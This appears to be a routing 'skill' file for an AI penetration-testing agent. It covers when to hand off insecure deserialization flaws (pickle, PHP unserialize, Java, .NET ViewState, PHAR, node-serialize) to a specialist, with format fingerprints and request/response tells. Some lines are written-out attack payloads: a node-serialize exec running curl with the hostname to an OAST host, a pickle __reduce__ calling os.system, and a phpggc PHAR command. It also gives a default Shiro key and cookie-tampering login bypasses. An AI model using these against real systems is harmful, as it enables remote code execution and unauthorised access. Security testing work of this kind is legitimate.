# deserialization — when to use

Use this skill when user-controlled bytes are fed to a language-level deserializer (`pickle.loads`, PHP `unserialize()`, Java `readObject`/`ObjectInputStream`, Ruby `Marshal.load`, `yaml.load`, .NET `BinaryFormatter`/`LosFormatter`/`ObjectStateFormatter`, polymorphic JSON revivers) and the exploit hinges on the serializer's format and gadget chains — not on a plain `eval`/command sink.

## Trigger signals (dispatch the moment you observe…)

**Encoded blob whose bytes match a serialization format.** Decode any base64/URL-encoded cookie, token, hidden field, or header and check the leading bytes:
- `gAR` / `gAS` / `gAJ` / `gAM` / `gAQ` → Python pickle (`\x80\x02`/`\x80\x04` magic; proto 2+). Confirm with an embedded dotted module/class path (e.g. `app.models`, `UrlObj`, `copy_reg`, `__reduce__` opcodes) → server-side `pickle.loads()` sink.
- `a:N:{...}` (serialized array) / `O:N:"ClassName":...` (serialized object) / `s:N:"..."` → PHP `serialize()`. Cookies named `creds=`, `data=`, `auth=`, `remember=` decoding to these are the canonical PHP surface.
- `rO0AB` (`ac ed 00 05`) → Java serialization. `H4sIA` → gzip-wrapped (often Java). `BAg` (`04 08`) → Ruby Marshal. `AAEAAAD/////` → .NET BinaryFormatter. `/wEP...` → ASP.NET LosFormatter/ObjectStateFormatter.
- YAML object syntax (`!!python/object`, `!!ruby/object`) in the decoded blob → unsafe `yaml.load`.

**Explicit content types / fields:**
- `Content-Type: application/x-java-serialized-object` → Java deserialization endpoint, dispatch immediately. Same for `application/x-amf` (Adobe AMF / Flash / BlazeDS).
- `__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION` hidden fields → ASP.NET ViewState surface. Highest-value when there is no MAC, or the app uses default/leaked machine keys.
- `JSESSIONID`/session cookie that base64-decodes to `rO0AB` → Java session-in-cookie (Tomcat `PersistentManager`), deserialized every request.
- Apache Shiro `rememberMe` cookie or Spring Security `remember-me` cookie → AES-encrypted serialized object; default Shiro key `kPH+bIxk5D2deZiIxcaaaA==` is widely deployed.

**Error/diagnostic leaks:** a stack trace or 500 containing `readObject`, `ObjectInputStream`, `unserialize()`, `pickle.loads`, `Marshal.load`, `yaml.load`, `Newtonsoft.Json`, `BinaryFormatter`, `LosFormatter`, or `ObjectStateFormatter` after you tamper an encoded value → the value hits a live deserializer.

**Behavioural tells:**
- A value that round-trips `decode → opaque blob → re-encode` unchanged, but flipping one middle byte makes the app error or behave differently → a deserializer parses it, not echoes it.
- A JSON body where injecting `$type` (.NET / Json.NET) or `@class`/polymorphic type hints (Jackson) changes parsing → polymorphic typing enabled, arbitrary type instantiation possible.
- `node-serialize` `_$$ND_FUNC$$_` literal echoed or accepted in a JSON body → near-instant Node RCE on deserialize.

**Upload / app-shape tells:**
- A file-upload form whose parameter or accepted extension names a serialization format: input named `pickle_file`, `serialized`, or extensions `.ser`, `.phar`, `.pkl`, `.pickle`, `.bin`, `.dat`, `.rdb`, YAML — or a page titled e.g. "Pickle CTF". The upload IS the sink; dispatch before other classes.
- A PHP/Composer app (`composer.json` + `composer.lock` returning 200, reachable `/vendor/`, `X-Powered-By: PHP`) **plus** any endpoint that takes a filename/path/upload → PHAR deserialization candidate. Any filesystem call (`file_exists`, `getimagesize`, `fopen`, `is_dir`) on a `phar://` URL triggers object reconstruction, even with no visible `unserialize()`. Do not let a co-present SSRF/LFI lead crowd this out — dispatch both.
- App/route/container names advertising serialization: `deserialization_yaml_bookmarks`, routes `/import`, `/restore`, `/load`, `/deserialize`, "bookmarks/notes/cart/profile stored in an opaque cookie" UX where state survives across requests in a client-held blob → the app trusts client-supplied serialized objects.
- Import/export, RPC, message-queue, JMX/RMI/T3/IIOP, or "restore from backup" endpoints taking an opaque binary body → classic server-side sinks.

## Use-case scenarios

- **Stateful clients that "trust their own cookies."** A session/identity object is serialized into a cookie/token and deserialized on each request. If it lacks integrity protection (no HMAC, or a known/default key), substitute a gadget-chain object — or, when the win is simpler, just edit identity fields. Capture the blob before login, after login, and after a state change; diff the values; decode each; fingerprint the format from its first bytes. Surfaces: Shiro `rememberMe`, Java session cookies, Laravel `decrypt()` when `APP_KEY` leaks, signed-but-default ViewState, PHP `creds`/`data` cookies.
- **Privilege escalation / auth bypass via field tampering.** When the serialized blob carries `username`, `userid`, `role`, `is_admin`, the win may be a field edit, not a gadget chain: re-serialize with `username=admin` / `userid=1` (fix the `s:N` length on PHP strings) and replay. This finish overlaps with the session/auth specialist — dispatch this skill to fingerprint and confirm; either route is valid.
- **File uploads the backend deserializes.** When the parameter name or backend says the upload is parsed as a serialized object, the upload is `pickle.loads()`/`unserialize()`'d server-side and sending a `__reduce__`/gadget object yields command output.
- **ASP.NET ViewState.** Evaluate every `__VIEWSTATE`. If `enableViewStateMac="false"`, a default/published `<machineKey>`, or a `web.config` disclosure leaks `validationKey`/`decryptionKey`, ViewState is single-shot RCE via `LosFormatter`.
- **Polymorphic JSON APIs.** Jackson `enableDefaultTyping()`/`@JsonTypeInfo` and Json.NET `TypeNameHandling != None` let user-supplied JSON pick the class to instantiate; looks like a normal REST endpoint until you add a type hint.
- **PHP apps doing file ops on user paths (PHAR).** Image processors, file-existence checks, "preview this upload" features are deserialization sinks via `phar://` even with no visible `unserialize()`.
- **Python/Ruby internal tooling.** `pickle.loads`, unsafe `yaml.load`, `marshal.loads`, `Marshal.load`, `YAML.load` are instant code execution on untrusted bytes — common in ML model loaders, caching layers, job queues, "load saved state" features.
- **Legacy enterprise middleware.** WebLogic (T3), JBoss, WebSphere, RMI registries, JMX consoles — `ObjectInputStream` sinks often reachable pre-auth on non-standard ports.
- **When `rce` finds an opaque-byte sink with no obvious `eval`/command wrapper** and code runs *during reconstruction* (constructors, magic methods, custom readers) — this is the correct specialist over generic `rce`.

## Concrete tells (request → response examples)

- **Pickle cookie (Python/Flask).** `GET /list` → `Set-Cookie: bookmarks=gARdlC4=`. `base64 -d` → `\x80\x04]\x94.` (proto-4 pickle of an empty list). After adding an item, `bookmarks=gASVUQAA...` decodes to a stream containing `app.models` and `UrlObj`. `\x80\x04` magic + embedded module path = confirmed pickle sink; build a `__reduce__` RCE pickle.
- **PHP serialize cookie (auth).** `POST /index.php` `username=test&password=test` → `Set-Cookie: creds=YToyOntzOjg6...%3D%3D`. URL- then base64-decode → `a:2:{s:8:"username";s:4:"test";s:8:"password";s:4:"test";}`. Replay with `username` changed to `admin` (and the `s:N` length fixed) to bypass login.
- **PHP serialize cookie (object).** `X-Powered-By: PHP/7.1.33`, `PHPSESSID` + a `data=` cookie after login decoding to `O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:5:"admin";}`. Edit `userid`/`username` and replay to escalate.
- **Pickle upload (Python/FastAPI).** Homepage `<form action="/" method="post" enctype="multipart/form-data"> ... <label for="pickle_file">`, `<title>Pickle CTF</title>`; `/docs` + `/openapi.json` confirm FastAPI. Upload a pickle whose `__reduce__` runs a command → command output in the response.
- **Phar / Composer PHP.** `gobuster` shows `composer.json (200)`, `composer.lock (200)`, `vendor/ (301)`; Apache + PHP headers. Combined with a filename/upload parameter, this is the PHAR fingerprint.
- **Java URLDNS probe.** Send a `URLDNS` ysoserial blob (JDK-only, DNS-only, no code execution) to the suspected sink. OAST DNS lookup logged → `readObject` reachable, escalate to a real chain. No callback but a clean response = sink may be filtered (`ObjectInputFilter`) or not actually deserializing.
- **Byte-flip differential.** Truncate one byte from the middle of the encoded value and resend. A 500 with `java.io.StreamCorruptedException`, `unserialize(): Error at offset`, `_pickle.UnpicklingError`, `EOFError`, or `Psych::SyntaxError` confirms a live deserializer; a normal 200 (value ignored) suggests it is opaque/echoed.
- **PHP serialized tamper.** Given `O:4:"User":1:{s:4:"name";s:3:"bob";}`, change the property count or a type tag (`s:3` → `s:4`). `Notice: unserialize(): Error at offset N` or a `__wakeup`/`__destruct` warning confirms `unserialize()` on your input.
- **PHAR trigger.** `phpggc -p phar -pj polyglot.jpg Monolog/RCE1 system id` uploaded as an image, then hit any feature doing a filesystem op on it via `phar://`. A DNS/HTTP callback (set gadget command to `nslookup $RAND.oast.tld`) confirms metadata deserialization.
- **Json.NET `$type` probe.** Add `"$type":"System.Windows.Data.ObjectDataProvider, ...", ...` to a JSON body. A "could not load type" / "type is not allowed" error mentioning the type name → `TypeNameHandling` on and exploitable; a generic 400 with no type mention → likely `None`.
- **ViewState MAC test.** Send an unsigned ysoserial.net `LosFormatter` blob in `__VIEWSTATE`. `Validation of viewstate MAC failed` confirms MAC enabled (need the key); successful render/execution confirms unsigned or default-keyed.
- **Python pickle oracle.** A class whose `__reduce__` returns `(os.system, ('nslookup $RAND.oast.tld',))` (~30 bytes) sent to a `pickle.loads` sink. DNS callback proves execution; `find_class` restriction errors mean a guarded unpickler.
- **Node node-serialize.** `{"x":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://$RAND.oast.tld/$(hostname)')}()"}`. Inbound HTTP with the hostname proves RCE on deserialize.

## When NOT to use it / easily-confused-with

- **A base64 cookie is NOT automatically deserialization.** Decode first. A JWT (`eyJ...` three dot-separated base64 segments) is a token/JWT problem. A random hex/UUID session id with no structure (`user=3c3c56b1ff3e4b60...`) is an opaque server-side session handle. Only `\x80` (pickle), `a:`/`O:`/`s:` (PHP), `rO0AB`/`BAg`/format-magic, or YAML/XML object syntax confirm this class. A single app can hold both a deserializable cookie and an unrelated opaque session id — only the former is in scope.
- **Generic code-execution sinks → use `rce`.** Input landing in `eval()`, a shell wrapper, or a process spawn directly (not via a serializer) is plain command/code injection.
- **A URL-fetching form is SSRF, not deserialization** — even on a PHP/Composer app. An SSRF tell does not cancel a co-present deserialization tell; dispatch both rather than letting the louder lead consume the budget.
- **A reflected/echoed/stored value is XSS or SSTI, not deserialization,** unless the server *deserializes* it. A bookmark name echoed into HTML is XSS; `{{7*7}}` → `49` is SSTI. It is this skill's job only when the stored blob is an opaque serialized object reconstructed into a live object on read. Confirm with a byte-flip differential before dispatching.
- **A plain file upload is the insecure-file-uploads / RCE skill,** unless the uploaded bytes are deserialized (pickle/phar/Java/`.ser`). Otherwise route to insecure-file-uploads for webshell/extension-bypass work.
- **A 500 with no controlled output is not proof.** A crash on malformed bytes could be an ordinary parser bug. Require a quiet oracle (DNS/HTTP/timing) showing code ran *during* reconstruction before calling it deserialization RCE.
- **Plain auth/identity tampering → IDOR/auth-bypass/JWT skills.** A bare `userid=5` cookie or unsigned JWT is broken access control. Route here only when the tampered identity field lives inside a *serialized object graph* (and expect overlap with the session specialist).
- **Safe loaders defeat the class.** `yaml.safe_load`, `pickle` with a strict `find_class` allowlist, `JsonSerializer`/`JSON.parse`/`json.loads`/`DataContractJsonSerializer` without polymorphic typing or unsafe `KnownTypes`, Java `ObjectInputFilter`/allowlists, and signed ViewState without a leaked key all neutralise it — note them and route elsewhere rather than burning requests. The JSON danger is only in libraries that *revive* functions/classes/types (Json.NET `TypeNameHandling`, Jackson default typing, `node-serialize`).
- **Go gob and similar.** Rarely direct RCE; impact is usually type-confusion, panic-DoS, or memory exhaustion. Do not over-prioritise unless a decoded type has reflectively-invoked methods.
